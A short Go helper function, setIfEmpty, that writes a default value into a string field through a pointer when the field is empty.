func setIfEmpty(field *string, value string) {
	if *field == "" {
		*field = value
	}
}
